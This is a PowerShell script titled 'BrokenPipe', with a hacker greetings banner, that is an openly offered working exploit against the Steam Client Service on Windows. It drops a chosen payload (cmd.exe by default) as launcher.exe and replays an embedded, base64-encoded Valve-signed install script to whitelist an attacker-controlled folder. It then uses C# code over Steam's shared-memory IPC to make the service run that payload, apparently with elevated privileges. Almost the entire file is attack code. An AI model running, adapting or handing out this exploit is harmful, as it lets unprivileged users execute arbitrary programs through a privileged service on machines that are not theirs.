[CmdletBinding()]
param(
    [string]$PayloadPath = "$env:WINDIR\System32\cmd.exe",
    [string]$PayloadArguments = '',
    [string]$WorkRoot = (Join-Path $env:TEMP "BrokenPipe-$PID"),
    [uint32]$AppId = 431960
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

Write-Host @'
BrokenPipe - by @Killa
Greetz to (NIGHTMARE ECLIPSE/INFINITE NIGHTMARE/@MSNightmare2000), PLEASE HIRE HIM!

Shoutout to Tookie, Hazetick, belogen and Nehsam
Get Well Soon Muezza!
Thanks bet3rd for the tiktoks, you da best :3


Lusilly, I'm still waiting for our Overwatching session •`_´•
'@ -ForegroundColor Cyan

$steamPath = Join-Path `
    ([Environment]::GetFolderPath([Environment+SpecialFolder]::ProgramFilesX86)) `
    'Steam\steam.exe'

if (-not (Test-Path -LiteralPath $PayloadPath -PathType Leaf)) {
    throw "Payload not found: $PayloadPath"
}

if (-not (Test-Path -LiteralPath $steamPath -PathType Leaf)) {
    throw "Steam executable not found: $steamPath"
}

$null = New-Item -ItemType Directory -Path $WorkRoot -Force

$launcherPath = Join-Path $WorkRoot 'launcher.exe'
$signedVdfPath = Join-Path $WorkRoot 'signed.vdf'
$runVdfPath = Join-Path $WorkRoot 'run.vdf'

Copy-Item -LiteralPath $PayloadPath -Destination $launcherPath -Force

$signedVdfBase64 = @'
Ikluc3RhbGxTY3JpcHQiCnsKCSJSdW4gUHJvY2VzcyBPbiBVbmluc3RhbGwiCgl7CgkJIlByb2Nlc3NfbmFtZSIKCQl7CgkJCSJwcm9jZXNzIDEiCQkiJUlOU1RBTExESVIlXFxsYXVuY2hlci5le
GUiCgkJCSJjb21tYW5kIDEiCQkiLXVuaW5zdGFsbCIKCQl9Cgl9CgkiUnVuIFByb2Nlc3MiCgl7CgkJIkZpeCBXaW5kb3dzIE5ldHdvcmsgTWVkaWEgVGhyb3R0bGUiCgkJewoJCQkiSGFzUnVuS
2V5IgkJIkhLRVlfTE9DQUxfTUFDSElORVxcU29mdHdhcmVcXFZhbHZlXFxTdGVhbVxcQXBwc1xcNDMxOTYwXFxkaXNhYmxlTmV0d29ya1Rocm90dGxlIgoJCQkicHJvY2VzcyAxIgkJIiVJTlNUQU
xMRElSJVxcbGF1bmNoZXIuZXhlIgoJCQkiY29tbWFuZCAxIgkJIi1kaXNhYmxlbmV0d29ya3Rocm90dGxlIgoJCQkiTm9DbGVhblVwIgkJIjEiCgkJfQoJfQoJIkZpcmV3YWxsIgoJewoJCSJXYWx
scGFwZXIgRW5naW5lIFVJIgkJIiVJTlNUQUxMRElSJVxcYmluXFx3YWxscGFwZXJ1aS5leGUiCgl9Cn0KImt2c2lnbmF0dXJlcyIKewoJIkluc3RhbGxTY3JpcHQiCQkiN2EyZGZkNzAwZTE1NTdi
N2VjMDI0ZmEwODJjOTExZTVjYjU3OWZjMzczYWQxOTc2NzhhOTJiMTYyZjJlYTcwMjY5OWQ1NWE0YzExZjM5MmU2YzJiYjcyYzMzNjQwOTg1ODFlNDE5Y2FhY2RlMDM0ZjVhZGRiM2NiNTI3MjQ1Y
mI5MDQ0MTBmYzFjNGJlOWU1MDhlODRmODMwZWUxMmJlZDkwM2I1ODQ1ZjViZWViNTZiOWY0MzA1ZTk0OWQ3NjNkMjlkZWM1NWE4MjUzZWIwNjI1MGRiYjA5MDg2NzhjMzk1YWZjYTA3ZTc3OWY4MT
g0NjQxM2U0NGFiYTg0OTRkYiIKfQo=
'@

$signedVdfBytes = [Convert]::FromBase64String($signedVdfBase64)
[IO.File]::WriteAllBytes($signedVdfPath, $signedVdfBytes)

function ConvertTo-VdfString {
    param([Parameter(Mandatory)][string]$Value)

    $Value.Replace('\', '\\').Replace('"', '\"')
}

$runKey = "HKEY_LOCAL_MACHINE\Software\Valve\Steam\Apps\$AppId\BrokenPipe"
$escapedRunKey = ConvertTo-VdfString $runKey
$escapedLauncherPath = ConvertTo-VdfString $launcherPath
$escapedPayloadArguments = ConvertTo-VdfString $PayloadArguments

$runVdf = @"
"InstallScript"
{
    "Run Process"
    {
        "BrokenPipe"
        {
            "HasRunKey" "$escapedRunKey"
            "IgnoreHasRunKey" "1"
            "IgnoreExitCode" "1"
            "process 1" "$escapedLauncherPath"
            "command 1" "$escapedPayloadArguments"
        }
    }
}
"@

$utf8WithoutBom = [Text.UTF8Encoding]::new($false)
[IO.File]::WriteAllText($runVdfPath, $runVdf, $utf8WithoutBom)

Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public static class BrokenPipeIpc
{
    private const uint IpcTimeoutMilliseconds = 5000;
    private const uint FileMapReadWrite = 0x00000006;
    private const uint Synchronize = 0x00100000;
    private const uint WaitObject0 = 0;

    private const int IpcStateOffset = 4;
    private const int IpcPeerProcessIdOffset = 8;
    private const int IpcClientProcessIdOffset = 12;
    private const int IpcReadHandleOffset = 16;
    private const int IpcWriteHandleOffset = 20;
    private const int IpcRequestEventOffset = 24;
    private const int IpcReplyEventOffset = 28;
    private const int IpcReservedOffset = 32;

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr OpenFileMapping(
        uint desiredAccess,
        bool inheritHandle,
        string name);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr OpenEvent(
        uint desiredAccess,
        bool inheritHandle,
        string name);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateEvent(
        IntPtr eventAttributes,
        bool manualReset,
        bool initialState,
        string name);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr MapViewOfFile(
        IntPtr mapping,
        uint desiredAccess,
        uint fileOffsetHigh,
        uint fileOffsetLow,
        UIntPtr numberOfBytesToMap);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool UnmapViewOfFile(IntPtr address);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetEvent(IntPtr handle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ResetEvent(IntPtr handle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteFile(
        IntPtr handle,
        byte[] buffer,
        uint bytesToWrite,
        out uint bytesWritten,
        IntPtr overlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(
        IntPtr handle,
        byte[] buffer,
        uint bytesToRead,
        out uint bytesRead,
        IntPtr overlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool PeekNamedPipe(
        IntPtr handle,
        IntPtr buffer,
        uint bufferSize,
        IntPtr bytesRead,
        out uint bytesAvailable,
        IntPtr bytesLeftThisMessage);

    private static void Require(bool condition, string operation)
    {
        if (!condition)
        {
            throw new InvalidOperationException(
                operation + " failed (Win32 " + Marshal.GetLastWin32Error() + ").");
        }
    }

    private static void WriteUInt32(Stream stream, uint value)
    {
        byte[] bytes = BitConverter.GetBytes(value);
        stream.Write(bytes, 0, bytes.Length);
    }

    private static void WriteIpcString(Stream stream, string value)
    {
        byte[] bytes = Encoding.ASCII.GetBytes(value);
        stream.WriteByte(bytes.Length <= 253 ? (byte)(bytes.Length + 1) : (byte)255);
        stream.Write(bytes, 0, bytes.Length);
        stream.WriteByte(0);
    }

    private static byte[] AddFrameHeader(byte[] body)
    {
        using (var frame = new MemoryStream())
        {
            WriteUInt32(frame, (uint)body.Length);
            frame.Write(body, 0, body.Length);
            return frame.ToArray();
        }
    }

    private static byte[] CreateWhitelistFrame(string signedVdfPath, string installRoot)
    {
        using (var body = new MemoryStream())
        {
            body.WriteByte(1);
            body.WriteByte(1);
            WriteUInt32(body, 0);
            WriteUInt32(body, 0x1b7449c5);
            WriteIpcString(body, signedVdfPath);
            WriteIpcString(body, installRoot);
            WriteUInt32(body, 0x1b83cb83);
            return AddFrameHeader(body.ToArray());
        }
    }

    private static byte[] CreateRunFrame(string vdfPath, uint appId)
    {
        using (var body = new MemoryStream())
        {
            body.WriteByte(1);
            body.WriteByte(1);
            WriteUInt32(body, 0);
            WriteUInt32(body, 0xb1e810f9);
            WriteIpcString(body, vdfPath);
            WriteUInt32(body, appId);
            body.WriteByte(0);
            WriteUInt32(body, 0xb1f810b9);
            return AddFrameHeader(body.ToArray());
        }
    }

    private static byte[] ReadExact(IntPtr handle, int count)
    {
        int deadline = Environment.TickCount + (int)IpcTimeoutMilliseconds;
        uint bytesAvailable = 0;

        while (Environment.TickCount < deadline)
        {
            Require(
                PeekNamedPipe(
                    handle,
                    IntPtr.Zero,
                    0,
                    IntPtr.Zero,
                    out bytesAvailable,
                    IntPtr.Zero),
                "PeekNamedPipe");

            if (bytesAvailable >= count)
            {
                break;
            }

            Thread.Sleep(2);
        }

        Require(bytesAvailable >= count, "Waiting for Steam reply");

        byte[] buffer = new byte[count];
        uint bytesRead;
        Require(
            ReadFile(
                handle,
                buffer,
                (uint)count,
                out bytesRead,
                IntPtr.Zero) && bytesRead == count,
            "ReadFile");

        return buffer;
    }

    private static byte[] SendRequest(byte[] request)
    {
        IntPtr mapping = IntPtr.Zero;
        IntPtr view = IntPtr.Zero;
        IntPtr gate = IntPtr.Zero;
        IntPtr requestEvent = IntPtr.Zero;
        IntPtr readHandle = IntPtr.Zero;
        IntPtr writeHandle = IntPtr.Zero;
        IntPtr replyEvent = IntPtr.Zero;
        bool endpointRequestSubmitted = false;

        try
        {
            mapping = OpenFileMapping(
                FileMapReadWrite,
                false,
                "Global\\SteamClientService_SharedMemFile");
            Require(mapping != IntPtr.Zero, "OpenFileMapping");

            gate = OpenEvent(
                Synchronize,
                false,
                "Global\\SteamClientService_SharedMemLock");
            Require(gate != IntPtr.Zero, "OpenEvent");

            Require(
                WaitForSingleObject(gate, IpcTimeoutMilliseconds) == WaitObject0,
                "Waiting for the Steam IPC lock");

            view = MapViewOfFile(
                mapping,
                FileMapReadWrite,
                0,
                0,
                (UIntPtr)0x400);
            Require(view != IntPtr.Zero, "MapViewOfFile");

            Require(
                Marshal.ReadInt32(view, IpcStateOffset) == 0 &&
                Marshal.ReadInt32(view, IpcPeerProcessIdOffset) != 0,
                "Validating the Steam IPC state");

            requestEvent = CreateEvent(IntPtr.Zero, true, false, null);
            Require(requestEvent != IntPtr.Zero, "CreateEvent");

            Marshal.WriteInt32(
                view,
                IpcClientProcessIdOffset,
                System.Diagnostics.Process.GetCurrentProcess().Id);
            Marshal.WriteInt32(view, IpcReadHandleOffset, 0);
            Marshal.WriteInt32(view, IpcWriteHandleOffset, 0);
            Marshal.WriteInt32(view, IpcRequestEventOffset, (int)requestEvent.ToInt64());
            Marshal.WriteInt32(view, IpcReplyEventOffset, 0);
            Marshal.WriteInt32(view, IpcReservedOffset, 0);
            Marshal.WriteInt32(view, IpcStateOffset, 1);
            endpointRequestSubmitted = true;

            int deadline = Environment.TickCount + (int)IpcTimeoutMilliseconds;
            while (
                Marshal.ReadInt32(view, IpcStateOffset) == 1 &&
                Environment.TickCount < deadline)
            {
                Thread.Sleep(1);
            }

            Require(
                Marshal.ReadInt32(view, IpcStateOffset) == 2,
                "Steam IPC endpoint transfer");

            readHandle = (IntPtr)(uint)Marshal.ReadInt32(view, IpcReadHandleOffset);
            writeHandle = (IntPtr)(uint)Marshal.ReadInt32(view, IpcWriteHandleOffset);
            replyEvent = (IntPtr)(uint)Marshal.ReadInt32(view, IpcReplyEventOffset);

            Require(
                readHandle != IntPtr.Zero &&
                writeHandle != IntPtr.Zero &&
                replyEvent != IntPtr.Zero,
                "Validating transferred IPC handles");

            Marshal.WriteInt32(view, IpcStateOffset, 3);

            deadline = Environment.TickCount + (int)IpcTimeoutMilliseconds;
            while (
                Marshal.ReadInt32(view, IpcStateOffset) != 0 &&
                Environment.TickCount < deadline)
            {
                Thread.Sleep(2);
            }

            Require(
                Marshal.ReadInt32(view, IpcStateOffset) == 0,
                "Completing Steam IPC setup");

            uint bytesWritten;
            Require(
                WriteFile(
                    writeHandle,
                    request,
                    (uint)request.Length,
                    out bytesWritten,
                    IntPtr.Zero) && bytesWritten == request.Length,
                "WriteFile");

            Require(SetEvent(requestEvent), "SetEvent");
            Require(
                WaitForSingleObject(replyEvent, IpcTimeoutMilliseconds) == WaitObject0,
                "Waiting for the Steam reply");

            int responseSize = BitConverter.ToInt32(ReadExact(readHandle, 4), 0);
            return ReadExact(readHandle, responseSize);
        }
        finally
        {
            if (writeHandle != IntPtr.Zero && requestEvent != IntPtr.Zero)
            {
                uint ignored;
                byte[] closeFrame = { 1, 0, 0, 0, 5 };

                ResetEvent(requestEvent);
                if (WriteFile(
                    writeHandle,
                    closeFrame,
                    (uint)closeFrame.Length,
                    out ignored,
                    IntPtr.Zero))
                {
                    SetEvent(requestEvent);
                }
            }

            if (!endpointRequestSubmitted && gate != IntPtr.Zero)
            {
                SetEvent(gate);
            }

            if (view != IntPtr.Zero)
            {
                UnmapViewOfFile(view);
            }

            IntPtr[] handles = {
                readHandle,
                writeHandle,
                replyEvent,
                requestEvent,
                gate,
                mapping
            };

            foreach (IntPtr handle in handles)
            {
                if (handle != IntPtr.Zero)
                {
                    CloseHandle(handle);
                }
            }
        }
    }

    public static int Whitelist(string signedVdfPath, string installRoot)
    {
        byte[] reply = SendRequest(CreateWhitelistFrame(signedVdfPath, installRoot));
        Require(
            reply.Length == 5 && reply[0] == 1,
            "Validating the whitelist reply");
        return BitConverter.ToInt32(reply, 1);
    }

    public static bool Run(string vdfPath, uint appId)
    {
        byte[] reply = SendRequest(CreateRunFrame(vdfPath, appId));
        Require(
            reply.Length == 2 && reply[0] == 1,
            "Validating the run reply");
        return reply[1] == 1;
    }
}
'@

if (-not (Get-Process -Name steam -ErrorAction SilentlyContinue)) {
    Start-Process -FilePath $steamPath -ArgumentList '-silent'
    Start-Sleep -Seconds 15
}

$whitelistResult = [BrokenPipeIpc]::Whitelist($signedVdfPath, $WorkRoot)
if ($whitelistResult -ne 0) {
    throw "Steam rejected the Valve-signed VDF (result: $whitelistResult)."
}

if (-not [BrokenPipeIpc]::Run($runVdfPath, $AppId)) {
    throw 'Steam rejected the run request.'
}

Write-Host `
    "Steam accepted the launch request: $launcherPath $PayloadArguments" `
    -ForegroundColor Green
